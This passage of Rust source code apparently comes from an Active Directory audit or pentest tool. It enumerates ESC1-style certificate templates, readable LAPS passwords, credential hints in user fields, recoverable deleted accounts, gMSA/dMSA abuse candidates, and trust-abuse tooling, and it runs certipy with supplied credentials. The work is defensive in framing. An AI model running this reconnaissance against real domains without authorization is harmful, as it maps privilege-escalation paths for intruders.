        let has_auth_eku = ekus.iter().any(|oid| {
            matches!(
                oid.as_str(),
                "1.3.6.1.5.5.7.3.2" | "1.3.6.1.4.1.311.20.2.2" | "2.5.29.37.0"
            )
        });

        if enrollee_supplies_subject && has_auth_eku && !requires_manager_approval && ra_sig == 0 {
            risky.push(name);
        }
    }

    findings.push(AuthFinding {
        id: "AUTH-ADCS-TEMPLATES-PRESENT".to_string(),
        severity: "info".to_string(),
        title: "AD CS certificate templates enumerated".to_string(),
        evidence: format!("{} templates discovered for ESC-style review", entries.len()),
        recommendation:
            "Review template ACLs and risky flags (enrollee supplies subject, client auth EKU, broad enrollment rights)."
                .to_string(),
    });

    if !risky.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-ADCS-ESC1-HEURISTIC".to_string(),
            severity: "high".to_string(),
            title: "Potentially ESC1-like risky certificate templates found".to_string(),
            evidence: format!("Risky templates: {}", display_limited(&risky, 10)),
            recommendation: "Restrict enrollment rights, require manager approval/authorized signatures, and remove risky SAN/subject supply settings."
                .to_string(),
        });
    }
    Ok(())
}

async fn collect_machine_account_quota(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Base,
            "(objectClass=*)",
            vec!["ms-DS-MachineAccountQuota"],
        )
        .await?;
    let (entries, _) = query.success()?;
    for entry in entries {
        let e = SearchEntry::construct(entry);
        if let Some(v) = e
            .attrs
            .get("ms-DS-MachineAccountQuota")
            .and_then(|vals| vals.first())
        {
            if let Ok(n) = v.parse::<i32>() {
                if n > 0 {
                    findings.push(AuthFinding {
                        id: "AUTH-MAQ".to_string(),
                        severity: "medium".to_string(),
                        title: "MachineAccountQuota allows machine account creation by users"
                            .to_string(),
                        evidence: format!("ms-DS-MachineAccountQuota={}", n),
                        recommendation:
                            "Set MAQ to 0 unless explicitly required for join workflows."
                                .to_string(),
                    });
                }
            }
        }
    }
    Ok(())
}

async fn collect_pso(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let pso_base = format!("CN=Password Settings Container,CN=System,{}", base_dn);
    let query = ldap
        .search(
            &pso_base,
            Scope::OneLevel,
            "(objectClass=msDS-PasswordSettings)",
            vec![
                "name",
                "msDS-MinimumPasswordLength",
                "msDS-LockoutThreshold",
            ],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if entries.is_empty() {
        return Ok(());
    }

    findings.push(AuthFinding {
        id: "AUTH-PSO".to_string(),
        severity: "info".to_string(),
        title: "Fine-Grained Password Policy objects found".to_string(),
        evidence: format!("{} PSO objects discovered", entries.len()),
        recommendation:
            "Review PSO scope and ensure privileged identities have strong dedicated policies."
                .to_string(),
    });
    Ok(())
}

async fn collect_computer_inventory(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(objectClass=computer)",
            vec!["dNSHostName", "operatingSystem"],
        )
        .await?;
    let (entries, _) = query.success()?;
    if entries.is_empty() {
        return Ok(());
    }

    let mut obsolete = Vec::new();
    for entry in entries {
        let e = SearchEntry::construct(entry);
        let host = e
            .attrs
            .get("dNSHostName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let os = e
            .attrs
            .get("operatingSystem")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let los = os.to_ascii_lowercase();
        if los.contains("2008")
            || los.contains("2003")
            || los.contains("xp")
            || los.contains("windows 7")
        {
            obsolete.push(format!("{} ({})", host, os));
        }
    }
    if !obsolete.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-OBSOLETE-OS".to_string(),
            severity: "high".to_string(),
            title: "Obsolete operating systems discovered".to_string(),
            evidence: display_limited(&obsolete, 10),
            recommendation: "Prioritize upgrade/isolation of legacy systems.".to_string(),
        });
    }
    Ok(())
}

async fn collect_subnets_sites(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let conf = format!("CN=Configuration,{}", base_dn);
    let subnet_base = format!("CN=Subnets,CN=Sites,{}", conf);
    let query = ldap
        .search(
            &subnet_base,
            Scope::OneLevel,
            "(objectClass=subnet)",
            vec!["name", "siteObject"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if entries.is_empty() {
        return Ok(());
    }
    findings.push(AuthFinding {
        id: "AUTH-SUBNETS".to_string(),
        severity: "info".to_string(),
        title: "AD Sites/Subnets objects found".to_string(),
        evidence: format!("{} subnet objects discovered", entries.len()),
        recommendation: "Review subnet/site mapping for segmentation and tiering alignment."
            .to_string(),
    });
    Ok(())
}

async fn collect_sccm_hints(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let conf = format!("CN=Configuration,{}", base_dn);
    let query = ldap
        .search(
            &conf,
            Scope::Subtree,
            "(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite))",
            vec!["cn"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if !entries.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-SCCM".to_string(),
            severity: "medium".to_string(),
            title: "SCCM infrastructure objects detected".to_string(),
            evidence: format!("{} SCCM-related LDAP objects found", entries.len()),
            recommendation: "Assess SCCM roles/permissions for lateral movement abuse paths."
                .to_string(),
        });
    }
    Ok(())
}

async fn collect_user_attr_hints(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectCategory=person)(objectClass=user))",
            vec![
                "sAMAccountName",
                "description",
                "info",
                "userPassword",
                "unixUserPassword",
            ],
        )
        .await?;
    let (entries, _) = query.success()?;

    let mut desc_hits = Vec::new();
    let mut info_hits = Vec::new();
    let mut pwd_attr = 0usize;
    for entry in entries {
        let e = SearchEntry::construct(entry);
        let user = e
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());

        if let Some(d) = e.attrs.get("description").and_then(|v| v.first()) {
            let ld = d.to_ascii_lowercase();
            if ld.contains("pass") || ld.contains("pwd") || ld.contains("cred") {
                desc_hits.push(format!("{}: {}", user, d));
            }
        }
        if let Some(i) = e.attrs.get("info").and_then(|v| v.first()) {
            let li = i.to_ascii_lowercase();
            if li.contains("pass") || li.contains("pwd") || li.contains("cred") {
                info_hits.push(format!("{}: {}", user, i));
            }
        }
        if e.attrs.get("userPassword").is_some() || e.attrs.get("unixUserPassword").is_some() {
            pwd_attr += 1;
        }
    }

    if !desc_hits.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-USER-DESC-HINTS".to_string(),
            severity: "high".to_string(),
            title: "Potential credential hints found in user descriptions".to_string(),
            evidence: display_limited(&desc_hits, 10),
            recommendation:
                "Remove secrets from LDAP description fields and rotate exposed credentials."
                    .to_string(),
        });
    }
    if !info_hits.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-USER-INFO-HINTS".to_string(),
            severity: "high".to_string(),
            title: "Potential credential hints found in user info fields".to_string(),
            evidence: display_limited(&info_hits, 10),
            recommendation: "Remove secrets from LDAP info fields and rotate exposed credentials."
                .to_string(),
        });
    }
    if pwd_attr > 0 {
        findings.push(AuthFinding {
            id: "AUTH-USER-PASSWORD-ATTR".to_string(),
            severity: "critical".to_string(),
            title: "Readable password-related LDAP attributes found".to_string(),
            evidence: format!(
                "{} user objects exposed userPassword/unixUserPassword",
                pwd_attr
            ),
            recommendation:
                "Immediately remove exposed password attributes and audit directory ACLs."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_deleted_recoverable_accounts(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let deleted_base = format!("CN=Deleted Objects,{}", base_dn);
    let controls = vec![
        RawControl {
            ctype: "1.2.840.113556.1.4.417".to_string(), // Show Deleted Objects
            crit: false,
            val: None,
        },
        RawControl {
            ctype: "1.2.840.113556.1.4.2064".to_string(), // Show Recycled Objects
            crit: false,
            val: None,
        },
    ];

    let query = ldap
        .with_controls(controls)
        .search(
            &deleted_base,
            Scope::OneLevel,
            "(&(isDeleted=TRUE)(|(objectClass=user)(objectClass=computer)))",
            vec![
                "sAMAccountName",
                "msDS-LastKnownRDN",
                "lastKnownParent",
                "whenChanged",
                "isRecycled",
                "description",
            ],
        )
        .await;

    let Ok(resp) = query else {
        return Ok(());
    };
    let (entries, _) = match resp.success() {
        Ok(v) => v,
        Err(_) => return Ok(()),
    };

    let mut deleted_count = 0usize;
    let mut recoverable = Vec::new();
    let mut sample = Vec::new();

    for entry in entries {
        let e = SearchEntry::construct(entry);
        deleted_count += 1;

        let recycled = e
            .attrs
            .get("isRecycled")
            .and_then(|v| v.first())
            .map(|v| v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        let account = e
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .or_else(|| {
                e.attrs
                    .get("msDS-LastKnownRDN")
                    .and_then(|v| v.first())
                    .cloned()
            })
            .unwrap_or_else(|| "<unknown>".to_string());
        let parent = e
            .attrs
            .get("lastKnownParent")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let changed = e
            .attrs
            .get("whenChanged")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        let desc = e.attrs.get("description").and_then(|v| v.first()).cloned();

        if !recycled {
            recoverable.push(account.clone());
            if sample.len() < 12 {
                if let Some(d) = desc {
                    sample.push(format!(
                        "{} | parent={} | whenChanged={} | desc={}",
                        account, parent, changed, d
                    ));
                } else {
                    sample.push(format!(
                        "{} | parent={} | whenChanged={}",
                        account, parent, changed
                    ));
                }
            }
        }
    }

    if deleted_count > 0 {
        recoverable.sort_by_key(|u| u.to_lowercase());
        recoverable.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
        output::info(&format!(
            "Deleted account objects visible: {} total, {} potentially recoverable",
            deleted_count,
            recoverable.len()
        ));
        if !recoverable.is_empty() {
            output::kv(
                "Recoverable Deleted Users",
                &display_limited(&recoverable, 10),
            );
        }
        findings.push(AuthFinding {
            id: "AUTH-DELETED-ACCOUNTS".to_string(),
            severity: if recoverable.is_empty() {
                "info".to_string()
            } else {
                "medium".to_string()
            },
            title: "Deleted AD account objects enumerated".to_string(),
            evidence: format!(
                "Deleted objects: {} | Potentially recoverable (not recycled): {} | Sample: {}",
                deleted_count,
                recoverable.len(),
                display_limited(&sample, 10)
            ),
            recommendation:
                "Review deleted objects for accidental deprovisioning and enforce strict controls on account deletion/recovery."
                    .to_string(),
        });
    }

    Ok(())
}

async fn collect_laps_readability(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(objectClass=computer)",
            vec!["dNSHostName", "ms-Mcs-AdmPwd", "msLAPS-Password"],
        )
        .await?;
    let (entries, _) = query.success()?;
    let mut laps_hosts = Vec::new();
    for entry in entries {
        let e = SearchEntry::construct(entry);
        let host = e
            .attrs
            .get("dNSHostName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        if e.attrs.get("ms-Mcs-AdmPwd").is_some() || e.attrs.get("msLAPS-Password").is_some() {
            laps_hosts.push(host);
        }
    }
    if !laps_hosts.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-LAPS-READ".to_string(),
            severity: "critical".to_string(),
            title: "LAPS passwords appear readable by current principal".to_string(),
            evidence: display_limited(&laps_hosts, 10),
            recommendation: "Restrict LAPS password read ACLs to dedicated tier-0 groups only."
                .to_string(),
        });
    }
    Ok(())
}

async fn collect_adcs_enrollment_services(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let conf = format!("CN=Configuration,{}", base_dn);
    let es_base = format!(
        "CN=Enrollment Services,CN=Public Key Services,CN=Services,{}",
        conf
    );
    let query = ldap
        .search(
            &es_base,
            Scope::OneLevel,
            "(objectClass=pKIEnrollmentService)",
            vec!["cn", "dNSHostName"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if !entries.is_empty() {
        let mut cas = Vec::new();
        for entry in entries {
            let e = SearchEntry::construct(entry);
            let name = e
                .attrs
                .get("cn")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "<unknown>".to_string());
            let host = e
                .attrs
                .get("dNSHostName")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "?".to_string());
            cas.push(format!("{}@{}", name, host));
        }
        findings.push(AuthFinding {
            id: "AUTH-ADCS-ENROLLMENT-SERVICES".to_string(),
            severity: "info".to_string(),
            title: "AD CS enrollment services discovered in LDAP".to_string(),
            evidence: display_limited(&cas, 10),
            recommendation:
                "Assess CA/template permissions and EPA/HTTPS posture for AD CS hardening."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_groups_inventory(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(objectClass=group)",
            vec!["sAMAccountName", "cn", "member"],
        )
        .await?;
    let (entries, _) = query.success()?;
    if entries.is_empty() {
        return Ok(());
    }

    let total = entries.len();
    let mut sample = Vec::new();
    for entry in entries.into_iter().take(20) {
        let e = SearchEntry::construct(entry);
        let name = e
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .or_else(|| e.attrs.get("cn").and_then(|v| v.first()).cloned())
            .unwrap_or_else(|| "<unknown>".to_string());
        let members = e.attrs.get("member").map(|v| v.len()).unwrap_or(0);
        sample.push(format!("{}({} members)", name, members));
    }

    findings.push(AuthFinding {
        id: "AUTH-GROUPS-INVENTORY".to_string(),
        severity: "info".to_string(),
        title: "Group inventory enumerated".to_string(),
        evidence: format!(
            "{} groups discovered. Sample: {}",
            total,
            display_limited(&sample, 10)
        ),
        recommendation: "Review high-privilege and delegated groups for abuse paths.".to_string(),
    });
    Ok(())
}

async fn collect_gpo_inventory(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let policies_base = format!("CN=Policies,CN=System,{}", base_dn);
    let query = ldap
        .search(
            &policies_base,
            Scope::OneLevel,
            "(objectClass=groupPolicyContainer)",
            vec!["displayName", "name", "gPCFileSysPath"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if entries.is_empty() {
        return Ok(());
    }
    let total = entries.len();
    let mut sample = Vec::new();
    for entry in entries.into_iter().take(20) {
        let e = SearchEntry::construct(entry);
        let name = e
            .attrs
            .get("displayName")
            .and_then(|v| v.first())
            .cloned()
            .or_else(|| e.attrs.get("name").and_then(|v| v.first()).cloned())
            .unwrap_or_else(|| "<unknown>".to_string());
        let path = e
            .attrs
            .get("gPCFileSysPath")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<no path>".to_string());
        sample.push(format!("{} -> {}", name, path));
    }
    findings.push(AuthFinding {
        id: "AUTH-GPO-INVENTORY".to_string(),
        severity: "info".to_string(),
        title: "Group Policy Objects discovered".to_string(),
        evidence: format!(
            "{} GPO objects discovered. Sample: {}",
            total,
            display_limited(&sample, 10)
        ),
        recommendation:
            "Review GPO ownership/link targets and writable policy paths for abuse opportunities."
                .to_string(),
    });
    Ok(())
}

async fn collect_entra_id_hints(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let comp_query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(objectClass=computer)",
            vec!["dNSHostName", "name", "description"],
        )
        .await?;
    let (comp_entries, _) = comp_query.success()?;
    let mut hits = Vec::new();
    for entry in comp_entries {
        let e = SearchEntry::construct(entry);
        let host = e
            .attrs
            .get("dNSHostName")
            .and_then(|v| v.first())
            .cloned()
            .or_else(|| e.attrs.get("name").and_then(|v| v.first()).cloned())
            .unwrap_or_else(|| "<unknown>".to_string());
        let desc = e
            .attrs
            .get("description")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let text = format!("{} {}", host, desc).to_ascii_lowercase();
        if text.contains("aadconnect")
            || text.contains("azure ad connect")
            || text.contains("adsync")
            || text.contains("entra")
        {
            hits.push(host);
        }
    }

    let user_query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(&(objectCategory=person)(objectClass=user)(sAMAccountName=MSOL_*))",
            vec!["sAMAccountName"],
        )
        .await?;
    let (user_entries, _) = user_query.success()?;
    for entry in user_entries {
        let e = SearchEntry::construct(entry);
        if let Some(u) = e.attrs.get("sAMAccountName").and_then(|v| v.first()) {
            hits.push(u.clone());
        }
    }

    if !hits.is_empty() {
        hits.sort_by_key(|s| s.to_lowercase());
        hits.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
        findings.push(AuthFinding {
            id: "AUTH-ENTRA-ID-HINTS".to_string(),
            severity: "medium".to_string(),
            title: "Potential Entra ID/AAD Connect sync infrastructure hints found".to_string(),
            evidence: display_limited(&hits, 10),
            recommendation: "Review Entra Connect host hardening and permissions (sync account, local admin, SQL access).".to_string(),
        });
    }

    Ok(())
}

async fn collect_group_membership_whoami(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    bind_principal: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let sam = bind_principal
        .split('\\')
        .next_back()
        .unwrap_or(bind_principal)
        .split('@')
        .next()
        .unwrap_or(bind_principal)
        .trim()
        .to_string();
    if sam.is_empty() {
        return Ok(());
    }

    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            &format!(
                "(&(objectCategory=person)(objectClass=user)(sAMAccountName={}))",
                sam
            ),
            vec![
                "distinguishedName",
                "memberOf",
                "description",
                "sAMAccountName",
            ],
        )
        .await?;
    let (entries, _) = query.success()?;
    if entries.is_empty() {
        return Ok(());
    }
    let e = SearchEntry::construct(entries[0].clone());
    let dn = e
        .attrs
        .get("distinguishedName")
        .and_then(|v| v.first())
        .cloned()
        .unwrap_or_else(|| "<unknown>".to_string());
    let groups = e
        .attrs
        .get("memberOf")
        .cloned()
        .unwrap_or_default()
        .into_iter()
        .map(|g| {
            g.split(',')
                .next()
                .unwrap_or(&g)
                .trim_start_matches("CN=")
                .to_string()
        })
        .collect::<Vec<_>>();
    let mut evidence_parts = vec![format!("DN={}", dn)];
    if !groups.is_empty() {
        evidence_parts.push(format!("Groups={}", display_limited(&groups, 10)));
    }
    if let Some(desc) = e.attrs.get("description").and_then(|v| v.first()) {
        evidence_parts.push(format!("Description={}", desc));
    }
    findings.push(AuthFinding {
        id: "AUTH-WHOAMI-GROUPMEMBERSHIP".to_string(),
        severity: "info".to_string(),
        title: "Authenticated principal identity and group membership".to_string(),
        evidence: evidence_parts.join(" | "),
        recommendation: "Verify this principal's tiering and delegated privileges.".to_string(),
    });
    Ok(())
}

async fn collect_dns_nonsecure_updates(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let zones_bases = vec![
        format!("DC=DomainDnsZones,{}", base_dn),
        format!("DC=ForestDnsZones,{}", base_dn),
    ];
    let mut risky = Vec::new();

    for base in zones_bases {
        let query = ldap
            .search(
                &base,
                Scope::Subtree,
                "(objectClass=dnsZone)",
                vec!["name", "allowUpdate"],
            )
            .await;
        let Ok(query) = query else {
            continue;
        };
        let Ok((entries, _)) = query.success() else {
            continue;
        };
        for entry in entries {
            let e = SearchEntry::construct(entry);
            let zone = e
                .attrs
                .get("name")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "<unknown>".to_string());
            let allow = e
                .attrs
                .get("allowUpdate")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "<unset>".to_string());
            // Common Microsoft DNS semantics: 1 == nonsecure and secure updates.
            if allow == "1" || allow.eq_ignore_ascii_case("nonsecureandsecure") {
                risky.push(format!("{}(allowUpdate={})", zone, allow));
            }
        }
    }

    if !risky.is_empty() {
        findings.push(AuthFinding {
            id: "AUTH-DNS-NONSECURE-UPDATE".to_string(),
            severity: "high".to_string(),
            title: "DNS zones allowing nonsecure dynamic updates detected".to_string(),
            evidence: display_limited(&risky, 10),
            recommendation:
                "Require secure-only dynamic updates and restrict zone update permissions."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_network_dns_inventory(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let zones_bases = vec![
        format!("DC=DomainDnsZones,{}", base_dn),
        format!("DC=ForestDnsZones,{}", base_dn),
    ];
    let mut dns_nodes = 0usize;
    let mut sample = Vec::new();
    for base in zones_bases {
        let query = ldap
            .search(
                &base,
                Scope::Subtree,
                "(objectClass=dnsNode)",
                vec!["name", "distinguishedName"],
            )
            .await;
        let Ok(query) = query else {
            continue;
        };
        let Ok((entries, _)) = query.success() else {
            continue;
        };
        dns_nodes += entries.len();
        for entry in entries.into_iter().take(20) {
            let e = SearchEntry::construct(entry);
            let name = e
                .attrs
                .get("name")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_else(|| "<unknown>".to_string());
            sample.push(name);
        }
    }
    if dns_nodes > 0 {
        findings.push(AuthFinding {
            id: "AUTH-DNS-NETWORK-ENUM".to_string(),
            severity: "info".to_string(),
            title: "AD-integrated DNS records discovered".to_string(),
            evidence: format!(
                "{} dnsNode objects. Sample labels: {}",
                dns_nodes,
                display_limited(&sample, 10)
            ),
            recommendation:
                "Review DNS data exposure and stale records that can aid lateral movement."
                    .to_string(),
        });
    }
    Ok(())
}

async fn collect_dacl_readability(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Base,
            "(objectClass=domain)",
            vec!["nTSecurityDescriptor"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };

    let mut readable = false;
    for entry in entries {
        let e = SearchEntry::construct(entry);
        if let Some(v) = e.attrs.get("nTSecurityDescriptor") {
            if !v.is_empty() {
                readable = true;
                break;
            }
        }
    }

    if readable {
        findings.push(AuthFinding {
            id: "AUTH-DACLREAD-DOMAIN".to_string(),
            severity: "medium".to_string(),
            title: "Domain security descriptor appears readable".to_string(),
            evidence: "nTSecurityDescriptor returned for the domain object".to_string(),
            recommendation: "Perform targeted ACL analysis for delegated rights abuse paths."
                .to_string(),
        });
    }
    Ok(())
}

async fn collect_badsuccessor_heuristics(
    ldap: &mut ldap3::Ldap,
    base_dn: &str,
    findings: &mut Vec<AuthFinding>,
) -> Result<()> {
    let query = ldap
        .search(
            base_dn,
            Scope::Subtree,
            "(|(objectClass=msDS-DelegatedManagedServiceAccount)(objectClass=msDS-GroupManagedServiceAccount))",
            vec!["sAMAccountName", "objectClass"],
        )
        .await;
    let Ok(query) = query else {
        return Ok(());
    };
    let Ok((entries, _)) = query.success() else {
        return Ok(());
    };
    if entries.is_empty() {
        return Ok(());
    }
    let total = entries.len();
    let mut sample = Vec::new();
    for entry in entries.into_iter().take(12) {
        let e = SearchEntry::construct(entry);
        let name = e
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_else(|| "<unknown>".to_string());
        sample.push(name);
    }
    findings.push(AuthFinding {
        id: "AUTH-BADSUCCESSOR-HEURISTIC".to_string(),
        severity: "medium".to_string(),
        title: "DMSA/gMSA objects found (badsuccessor review candidate)".to_string(),
        evidence: format!(
            "{} candidate objects. Sample: {}",
            total,
            display_limited(&sample, 10)
        ),
        recommendation:
            "Review DMSA/gMSA delegation/ownership for badsuccessor-style abuse preconditions."
                .to_string(),
    });
    Ok(())
}

async fn attempt_certipy_find(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let bins = ["certipy", "certipy-ad"];
    for bin in bins {
        let out = Command::new(bin)
            .arg("find")
            .arg("-u")
            .arg(format!("{}@{}", username, domain))
            .arg("-p")
            .arg(password)
            .arg("-dc-ip")
            .arg(target)
            .arg("-vulnerable")
            .arg("-stdout")
            .output();

        match timeout(Duration::from_secs(90), out).await {
            Err(_) => continue,
            Ok(Err(e)) if e.kind() == ErrorKind::NotFound => continue,
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                let trimmed = stdout.trim().to_string();
                let preview = if trimmed.is_empty() {
                    "certipy find succeeded (no stdout)".to_string()
                } else {
                    let mut lines = trimmed
                        .lines()
                        .take(10)
                        .map(|l| l.trim().to_string())
                        .collect::<Vec<_>>()
                        .join(" | ");
                    if trimmed.lines().count() > 10 {
                        lines.push_str(" | <snip>");
                    }
                    lines
                };
                findings.push(AuthFinding {
                    id: "AUTH-CERTIPY-FIND".to_string(),
                    severity: "high".to_string(),
                    title: "certipy find executed successfully".to_string(),
                    evidence: format!("tool={} | {}", bin, preview),
                    recommendation: "Review vulnerable templates/ESC paths identified by certipy."
                        .to_string(),
                });
                return;
            }
            Ok(_) => continue,
        }
    }
}

async fn attempt_raisechild(
    target: &str,
    domain: &str,
    username: &str,
    _password: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let bins = ["raiseChild.py", "impacket-raiseChild"];
    for bin in bins {
        let out = Command::new(bin).arg("-h").output().await;
        match out {
            Ok(out) if out.status.success() || !out.stdout.is_empty() || !out.stderr.is_empty() => {
                findings.push(AuthFinding {
                    id: "AUTH-RAISECHILD-AVAILABLE".to_string(),
                    severity: "info".to_string(),
                    title: "raisechild tooling available for trust abuse testing".to_string(),
                    evidence: format!(
                        "tool={} available. Candidate principal: {}@{} (target dc-ip: {})",
                        bin, username, domain, target
                    ),
                    recommendation: "Use raisechild only in authorized trust contexts with explicit parent/child scope.".to_string(),
                });
                return;
            }
            Ok(_) => continue,
            Err(e) if e.kind() == ErrorKind::NotFound => continue,
            Err(_) => continue,
        }
    }
}
